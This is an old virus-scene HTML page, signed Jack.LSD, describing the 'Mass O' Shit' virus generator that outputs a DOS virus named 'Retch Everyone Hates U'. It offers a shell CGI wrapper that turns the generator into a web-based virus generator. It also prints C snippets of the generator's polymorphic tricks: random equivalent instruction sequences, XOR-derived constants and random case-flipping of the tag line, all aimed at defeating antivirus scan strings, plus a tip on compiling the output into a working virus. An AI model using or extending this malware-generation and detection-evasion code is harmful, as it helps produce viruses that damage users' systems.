<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">

<title>Miscellaneous - Mass O' Shit Generator Background</title>
</head>

<body background="miback01.gif" bgcolor="#C0C0C0" text="#000000"
link="#800000" vlink="#800000" alink="#800000">

<p align="center"><font color="#004080" size="6"><strong>- Mass
O' Shit -<br>
Mos virus generator background </strong></font></p>

<hr>

<p>Well creatures of the night heres a tidbit from the past
infact its a double tidbit. </p>

<p>Here is the virus generator called affectionately the
&quot;MOS&quot; or &quot;Mass O' Shit&quot;. This generator uses
a generates a basic virus called &quot;Retch Everyone Hates
U!&quot; The virus appears to have been chosen because of its
simplistic nature. There arent any huge decryption loops or off
the wall calls to interrupts to worry about. This gives someone
looking at the output of the generator a chance to actually
follow along. </p>

<p>The generator was originally released at version .2c and was
intended as only an in-house demo. The .2 series is an
introduction to the ideas of a virus generator while also laying
the ground work for the true heavy duty randomizing. The second
available version of this generator is.7c wich wasn't released
due to bugs in the program. The source code and binary for the
.7c were contributed so that you can look at the theorys
involved. It does delve into the ideas and theorys of make things
very random indeed. Even at this stage, its easy to see that the
generator is far from being completed. In the .7 series asm code
you will notice that the author left debugging code/comments. You
should in theory be able to debug the asm code and thus the
generator by replacing the &quot;blenderized&quot; code with the
original code. </p>

<p>A side note to the series, the .7d was modified by me Jack.LSD
as an expriment. Included here is source code for web based virus
generator. The code was converted from borland c++ to gnu c++ and
a shell cgi was created as a front end. There was one bug that I
found during the translation wich I fixed and the output of the
code was converted to stdout vice a file. The mos.cgi has only 1
variable that you need to change to get this to work and that is
TARGET, just point that at the path to the program. You can
change the &lt;BODY BGCOLOR&gt; line to any body and text color
that you want, infact the same thing is true about the
&lt;TITLE&gt; and &lt;P ALIGN&gt; statements. </p>

<pre>
#!/bin/sh
#
#

TARGET=path_to_the_compiled_program
TOPSTUFF='Content-type: text/html

&lt;HTML&gt;
&lt;HEAD&gt;
&lt;TITLE&gt;Source Of Kaos - MOS-REHU&lt;/TITLE&gt;
&lt;/HEAD&gt;
&lt;BODY BGCOLOR=&quot;#e8e8ff&quot;&gt;
&lt;P ALIGN=Left&gt;
'
if [ -x $TARGET ]; then
        if [ $# = 0 ]; then
                echo &quot;$TOPSTUFF&lt;H1&gt;Mass O Shit Online Virus Generator&lt;/H1&gt;&quot;
                $TARGET 2&gt;&amp;1
        fi
else
        echo AcK: somethings wrong ..
        fi
</pre>

<p>The generator is written in &quot;C/C++&quot; for probably
either Borland's Turbo C/C++ or their full release of C/C++. The
conversion or .7d version is written so that it compiles under
gcc. The code itself is aptly named by the auther &quot;Mass O
Shit&quot;. For it is a messy and poorly coded and designed. No
effort has been made to clean up or staighten this out, so if you
cant follow it, call someone who cares. </p>

<p>MOS is written as a stand alone program with no need for data
files. This approach isnt the best idea, though it has its own
merit. Its biggest dis-advantage is that everytime you want to
update the virus you get to spend a week re-inputting and
formating asm code to fit inside the C code. Wich also means you
get to re-do the randomizing code as well. The advantage to this
style of writing is that you dont have to come up anti-tamper
code for .dat files. </p>

<p>The basic idea behind the MOS Engine is that virus scanners
look for key pieces and values being found together. The second
idea being that given enough samples of virus code from a
generator or mutation engine that AVers will find common sections
of code that never change. Knowing what they are looking for
means you attack those standards to make it as hard as possible
to find that common ground. </p>

<p>In the .2 series there is just a basic attack on this problem
wich gives you a small fixed set of possibilities. The below
sample generates a replacement for mov ax, 3521h and its only
randomness comes in wich one of the six you get. </p>

<pre>
        if (c1==0) {
        fprintf(virname,&quot;        mov     ah,35h \n&quot;);
        fprintf(virname,&quot;        mov     al,21h \n&quot;);
        }
        if (c1==1) {
        fprintf(virname,&quot;        mov     al,21h  \n&quot;);
        fprintf(virname,&quot;        mov     ah,35h  \n&quot;);
        }
        if (c1==2) {
        fprintf(virname,&quot;        mov     ax,1414h  \n&quot;);
        fprintf(virname,&quot;        xor     al,35h  \n&quot;);
        fprintf(virname,&quot;        xor     ah,21h  \n&quot;);
        }
        if (c1==3) {
        fprintf(virname,&quot;        mov     ax,-13602d  \n&quot;);
        fprintf(virname,&quot;        not     ax  \n&quot;);
        }
        if (c1==4) {
        fprintf(virname,&quot;        mov     al,20h  \n&quot;);
        fprintf(virname,&quot;        inc     al  \n&quot;);
        fprintf(virname,&quot;        mov     ah,35h  \n&quot;);
        }
        if (c1==5) {
        fprintf(virname,&quot;        mov     al,21h  \n&quot;);
        fprintf(virname,&quot;        mov     ah,36h  \n&quot;);
        fprintf(virname,&quot;        dec     ah  \n&quot;);
        }
</pre>

<p>This same rough approach can be applied to almost any piece of
code that you want to replace. The same principle is used in the
.7 versions but they have been upgraded to provide a bit more of
a random kick. Here is the same section of code found in the 1st
example but instead of a static section of code you have a
random/static piece. This means you still have mov al , xxxx /
xor al, xxxx / mv ah, xxxx / xor ah, xxxx wich leaves you with
the same sequence of events but the numbers involved never are.
Combine this with the fact that there you have 5 other possible
code sequences and things can get rough on someone looking for
common code. </p>

<pre>
        if (c1==1) {
            y=random(220)+1;
            z=33;
            xor=z^y;
            fprintf(virname,&quot;        mov     al, 0%xh\n&quot;,xor);
            fprintf(virname,&quot;        xor     al, 0%xh\n&quot;,y);
            z=53;
            xor=z^y;
            fprintf(virname,&quot;        mov     ah, 0%xh\n&quot;,xor);
            fprintf(virname,&quot;        xor     ah, 0%xh\n&quot;,y);
        }
</pre>

<p>This small bit of confusion is based on the following bit of
code and some basic algerbra. Knowing what you want as the end
product gives you one variable and you can generate a random
number as your second variable. Now take that algebra and figure
out what you have to xor your random number by to get your end
result. </p>

<pre>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;
main()
{
        int  y,z,xor;
        randomize();
        printf (&quot;Random XOR routine\n&quot;);
        y=random(250)+1;
        z=13056;
        xor=z^y ;
        printf(&quot;xor   %xh, %xh\n&quot;,z,y);
        printf(&quot;equals %xh\n&quot;,xor);
        return 1;
}
</pre>

<p>In the REHU virus the &quot;tag line&quot; itself can be used
as a scan string so again, you know a key point and you attack
it. The .2 series had no such attack in it, where the .7 series
has this simple attack. </p>

<pre>
        stpcpy (beta,&quot;Retch EveryOne Hates U&quot;);
        /* Hehe 50/50 reverse */
        ul1=strlen(&quot;Retch EveryOne Hates U&quot;);
        for(loop1=0;loop1&lt;ul1;loop1++)
        {            
                s=beta[loop1];
                x=random(2);            
                if (x==1)
                {
                        t=toupper(s);
                }
                if (x==0)
                {
                        t=tolower(s);
                }
                fprintf(virname,&quot;%c&quot;,t);
        }
</pre>

<p>The basis of this attack as you probably notice is that it you
change case on the letters thus each generation has a differnt
looking &quot;tag line&quot;. You could easily make this even
more effective by throwing another 50/50 check in there to flip
your starting string. Wich would give you either &quot;Retch
EveryOne Hates U&quot; or &quot;U setaH enOyrevE hcteR&quot;.
This 50/50 could be taken a step further by flipping each word
you are workign with. The below snippet of code is what the 50/50
Upper or Lower is based on. </p>

<pre>
#include &lt;string.h&gt;
main()
{    
        char  beta[30], s, t;    
        int   x ,ul1, loop1;    
        randomize();    
        stpcpy (beta,&quot;Im a test&quot;);    
        ul1=strlen(&quot;Im a test&quot;);    
        printf (&quot;%d letters in Im a test\n&quot;, strlen(&quot;Im a test&quot;));    
        for(loop1=0;loop1&lt;ul1;loop1++)
        {        
                s=beta[loop1];        
                x=random(2);        
                if (x==1)
                {
                        t=toupper(s);
                }
                if (x==0)
                {
                        t=tolower(s);
                }
                printf(&quot;%c&quot;,t);
        }
}
</pre>

<p>Overall some of the methods used in the &quot;C source&quot;
for the generator arent done properly. The focus of the public
releases has been on something that works and adding new
features. The author talks about how much of the code has been
put into the blender and it seems like their should have been
more done. Even the most casual observer it should be obvious
that the author was looking for implementing ideas and theorys
and not mass quantity. It wouldnt take much for anyone to expand
a current subset or to add their own subsets. </p>

<p>Something not mentioned anywhere in the documentation is that
to compile the asm code into a working virus you have to use an
exe2com program. Seems Digital Anarchist is something of an ass
or a practical joker. </p>

<p>FWIW this was all originally intended for <a
href="ezines1.htm#SOK">SOK#4</a> but due to so much backstabbing
SOK#4 was dropped and I donnated the material to <a
href="ezines1.htm#CODE">CodeBreaker #4</a>. </p>

<p>Jack.LSD<br>
<a href="mailto:sok@int21h.org">sok@int21h.org </a></p>

<hr>
</body>
</html>
